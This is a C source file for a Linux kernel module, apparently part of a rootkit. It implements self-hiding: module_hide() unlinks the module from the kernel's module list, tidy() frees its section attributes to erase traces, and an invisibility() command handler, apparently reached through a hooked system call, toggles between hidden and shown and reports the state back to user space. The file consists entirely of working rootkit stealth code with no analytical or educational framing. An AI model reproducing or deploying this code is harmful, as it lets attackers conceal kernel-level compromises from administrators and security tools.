#include <linux/module.h>
#include <linux/uaccess.h>
#include <linux/slab.h>

// ////////////////////////////////////////////////////////////////////
// ////////////////////////////////////////////////////////////////////

#include "invisibility.h"

// ////////////////////////////////////////////////////////////////////
// ////////////////////////////////////////////////////////////////////

static struct list_head *module_previous;
static short module_hidden = 0;

// ////////////////////////////////////////////////////////////////////
// ////////////////////////////////////////////////////////////////////

static inline void tidy(void) {
    kfree(THIS_MODULE->sect_attrs);
    THIS_MODULE->sect_attrs = NULL;
}

// ////////////////////////////////////////////////////////////////////

void module_hide(void) {
    module_previous = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    module_hidden = 1;
}

// ////////////////////////////////////////////////////////////////////

void module_show(void) {
    list_add(&THIS_MODULE->list, module_previous);
    module_hidden = 0;
}

// ////////////////////////////////////////////////////////////////////
// ////////////////////////////////////////////////////////////////////

int invisibility(const struct pt_regs *regs, char *argv[], int argc) {
    char* new_state;

    if (module_hidden) {
        module_show();
        new_state = "shown";
    } else {
        module_hide();
        tidy();
        new_state = "hidden";
    }

    copy_to_user((void __user *)regs->di, new_state, strlen(new_state) + 1);

    return 0;
}